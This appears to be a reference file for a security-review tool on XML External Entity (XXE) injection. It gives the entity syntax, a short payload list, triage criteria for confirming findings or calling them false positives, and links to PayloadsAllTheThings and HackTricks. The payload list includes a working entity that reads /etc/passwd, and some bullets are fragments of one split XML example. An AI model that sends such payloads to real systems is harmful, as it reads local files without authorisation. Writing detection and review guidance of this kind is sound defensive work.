# XML External Entity (XXE) — @entityx skill
> cats: XXE · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
Syntax: `<!ENTITY entity_name "entity_value">`

## Exploit payloads (from PayloadsAllTheThings)
- `<!--?xml version="1.0" ?-->`
- `<!DOCTYPE replace [<!ENTITY example "Doe"> ]>`
- `<userInfo>`
- `<firstName>John</firstName>`
- `<lastName>&example;</lastName>`
- `</userInfo>`
- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`
- `<?xml version="1.0"?>`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=XML%20External%20Entity%20%28XXE%29
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (2)

- [PDF Upload: XXE and Same-Origin Policy Bypass](https://hacktricks.wiki/en/pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass)
- [XXE - XEE - XML External Entity](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
